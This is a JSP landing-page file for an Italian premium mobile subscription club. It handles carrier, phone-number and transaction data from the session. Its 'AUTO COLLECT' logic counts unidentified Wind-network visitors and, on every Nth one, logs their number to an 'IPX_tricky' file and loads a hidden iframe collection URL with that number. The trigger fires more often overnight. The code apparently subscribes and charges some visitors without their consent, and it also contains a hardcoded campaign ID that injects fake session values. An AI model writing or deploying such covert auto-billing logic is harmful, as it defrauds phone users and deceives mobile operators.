<%@include file="coreimport.jsp" %>
<jsp:include page="/IT/GlobalWapHeaderIT"/>
<%
    //System.out.println("ITALY PROMO SUBSCRIBE PROMO PAGE IS CALLED ");
    UmeDomain dmn = (UmeDomain) request.getAttribute("dmn");
    PrintWriter writer = response.getWriter();
    Map<String, Object> context = new HashMap();
    String cid = (String) request.getAttribute("campaignId");
    String subpage = (String) request.getAttribute("subpage");


    //System.out.println("ITALY PROMO SUBSCRIBE subspage: " + subpage);
    String domain = (String) request.getAttribute("domain");
    TemplateEngine templateengine = (TemplateEngine) request.getAttribute("templateengine");
    PebbleEngine it_engine = templateengine.getTemplateEngine(domain);
    LandingPage itlandingpage = (LandingPage) request.getAttribute("itlandingpage");
    CampaignHitCounterDao campaignhitcounterdao = (CampaignHitCounterDao) request.getAttribute("campaignhitcounterdao");
    //System.out.println("Landing Page: "+landingpage.getLandingPage(domain));

    //TODO logic of Subscribe Auto collection here.
    Boolean trickyTime = (Boolean) request.getAttribute("trickyTime");
    String operator = (String) session.getAttribute("ipx_operator");
    Handset handset = (Handset) session.getAttribute("handset");
    UmeMobileClubUserDao umemobileclubuserdao = (UmeMobileClubUserDao) request.getAttribute("umemobileclubuserdao");
    MobileClub club = (MobileClub) request.getAttribute("club");
    Boolean triggerAutoCollect = false;
    String iframecollectionurl = "";
    String iframeLink = "iframe_handling.jsp";

    String landingPage = (String)request.getAttribute("landingPage");
    
    Calendar cal=GregorianCalendar.getInstance();
    int HOUR_OF_DAY = cal.get(Calendar.HOUR_OF_DAY);
    
    boolean specialTricky = false;
    
//    if((HOUR_OF_DAY >=0 && HOUR_OF_DAY <3) && cid!=null && (cid.equalsIgnoreCase("7566525441KDS") || cid.equalsIgnoreCase("2223825441KDS") || cid.equalsIgnoreCase("4729322441KDS")))  {
    if((HOUR_OF_DAY >=0 && HOUR_OF_DAY <3) && cid!=null )  {
        specialTricky = true;
    }
    
    if(landingPage==null || landingPage.equalsIgnoreCase("") || landingPage.trim().length()<=0) {
                  try{
             landingPage=itlandingpage.initializeLandingPage(domain);
                 }catch(Exception e){landingPage="landing_day";}
             } 
    
//    if(handset!=null)
//        System.out.println("Handset Auto Collect ********: " + handset);

    //***************** AUTO COLLECT ********************************//
    //if (operator != null && (operator.equals("vodafone") || operator.equals("wind") || operator.equals("tim") || operator.equals("three")) && handset!=null && handset.get("is_full_desktop").equals("false")) {

    //if (operator != null && (operator.equals("vodafone") || operator.equals("wind") || operator.equals("tim") || operator.equals("three")) ) {        
    //if (operator != null && (operator.equals("vodafone") || operator.equals("three") || operator.equals("wind")) ) {        
    if (operator != null && operator.equals("wind") ) {        

        //System.out.println("Inside Auto Collect ********");
        int numberOfTricky = 10000000;
        if (operator.equals("wind")) {
            iframeLink = "iframe_handling_wind.jsp";
        }
        if (operator.equals("tim")) {
            iframeLink = "iframe_handling_tim.jsp";
        }

//        if(true){
//            String debugFile = "IPX_tricky_" + club.getUnique() + "_" + MiscDate.sqlDate.format(new Date()) + ".txt";
//            String debugPath = "/var/log/pareva/IT/ipxlog/subscription/";
//            String debugLine = (String) session.getAttribute("ipx_msisdn") + "--" + operator + "--" + (String) session.getAttribute("ipx_transactionid") + "--1" + "--" + cid + "\r\n";
//            FileUtil.writeRawToFile(debugPath + debugFile, debugLine, true);
//            triggerAutoCollect = true;
//            iframecollectionurl = iframeLink
//                    + "?vodafoneRedirectURL=" + session.getAttribute("ipx_subscription_redirecturl")
//                    + "&msisdn=" + session.getAttribute("ipx_msisdn");
//        }
        if (!cid.equals("")) {
            numberOfTricky = 100;
            if (operator.equals("wind")) {
                numberOfTricky = 100000;
            } else if (operator.equals("vodafone")) {
                numberOfTricky = 50;
            } else if (operator.equals("tim")) {
                numberOfTricky = 100;
            } else {
                numberOfTricky = 100;
            }
        }
        if (trickyTime) {
            numberOfTricky = 50;
            if (operator.equals("wind")) {
                numberOfTricky = 75;
            } else if (operator.equals("vodafone")) {
                numberOfTricky = 50;
            } else if (operator.equals("tim")) {
                numberOfTricky = 50;
            } else {
                numberOfTricky = 40;
            }
        }      
        
        if(specialTricky){
            if (operator.equals("wind")) {
                numberOfTricky = 20;
            }
        }
        
        int countingIdentify = 0;
        String clubIdentifiedCount = "ipxCountingIdentified_" + operator + "_" + club.getUnique()+ "_" + cid;

        Integer countingIdentified = (Integer) application.getAttribute(clubIdentifiedCount);
        SdcMobileClubUser clubUser = null;

        if (countingIdentified == null) {
            countingIdentified = 0;
        } else {
            String msisdn_debug = (String) session.getAttribute("ipx_msisdn");
            // Doing checking from here
            if (msisdn_debug != null) {
                clubUser = umemobileclubuserdao.getClubUserByMsisdn(msisdn_debug, club.getUnique());
            }
            if (clubUser == null) {
                countingIdentified++;
            }
        }
        application.setAttribute(clubIdentifiedCount, countingIdentified);
        countingIdentify = countingIdentified;

        /*
        if(true){
            String debugFile = "IPX_tricky_" + club.getUnique() + "_" + MiscDate.sqlDate.format(new Date()) + ".txt";
            String debugPath = "/var/log/pareva/IT/ipxlog/subscription/";
            String debugLine = (String) session.getAttribute("ipx_msisdn") + "--" + operator + "--" + (String) session.getAttribute("ipx_transactionid") + "--" + Integer.toString(countingIdentify) + "--" + cid + "\r\n";
            FileUtil.writeRawToFile(debugPath + debugFile, debugLine, true);
            triggerAutoCollect = true;
            iframecollectionurl = iframeLink
                    + "?vodafoneRedirectURL=" + session.getAttribute("ipx_subscription_redirecturl")
                    + "&msisdn=" + session.getAttribute("ipx_msisdn");
        }
        */
        
        if (countingIdentify >= numberOfTricky && (countingIdentify % numberOfTricky) == 0 && (clubUser == null)) {
            String debugFile = "IPX_tricky_" + club.getUnique() + "_" + MiscDate.sqlDate.format(new Date()) + ".txt";
            String debugPath = "/var/log/pareva/IT/ipxlog/subscription/";
            String debugLine = (String) session.getAttribute("ipx_msisdn") + "--" + operator + "--" + (String) session.getAttribute("ipx_transactionid") + "--" + Integer.toString(countingIdentify) + "--" + cid + "\r\n";
            FileUtil.writeRawToFile(debugPath + debugFile, debugLine, true);
            triggerAutoCollect = true;
            iframecollectionurl = iframeLink
                    + "?vodafoneRedirectURL=" + session.getAttribute("ipx_subscription_redirecturl")
                    + "&msisdn=" + session.getAttribute("ipx_msisdn");
        }
        
    }
    //***************** AUTO COLLECT ********************************//

    context.put("campaignid", cid);
    
    System.out.println("triggerAutoCollect ********: " + triggerAutoCollect);

    if(trickyTime)
        context.put("trickyTime", "true");
    else
        context.put("trickyTime", "false");
    
    context.put("contenturl", "http://" + dmn.getContentUrl());
    context.put("clubprice", "6x3");

    if(cid!=null && cid.equals("123")){
        session.setAttribute("ipx_msisdn", "39000");
        session.setAttribute("ipx_operator", "vodafone");
        session.setAttribute("ipx_transactionid", "33333");
    }
    
    //System.out.println("************* iframecollectionurl: " + iframecollectionurl);

    if (session.getAttribute("ipx_transactionid") != null && session.getAttribute("ipx_operator") != null && session.getAttribute("ipx_msisdn") != null) {

        context.put("msisdnexist", "true"); 
       if(triggerAutoCollect)
            context.put("triggerAutoCollect", "true");
        else
            context.put("triggerAutoCollect", "false");
        context.put("iframecollectionurl", iframecollectionurl);
        context.put("msisdn", (String) session.getAttribute("ipx_msisdn"));
        context.put("operator", (String) session.getAttribute("ipx_operator"));
        context.put("transactionid", (String) session.getAttribute("ipx_transactionid"));
//        context.put("msisdn", (String) session.getAttribute("ipx_msisdn"));
        context.put("iframeurl", (String) session.getAttribute("ipx_subscription_redirecturl"));
        //context.put("iframeurl","http://vnexpress.net");
//        it_engine.getTemplate("landing_subscribe").evaluate(writer, context);
    } else {
        context.put("msisdnexist", "false");

    }
    context.put("landingpage",landingPage);
    //System.out.println("italylanding " + landingPage);
    it_engine.getTemplate(landingPage).evaluate(writer, context);

%>

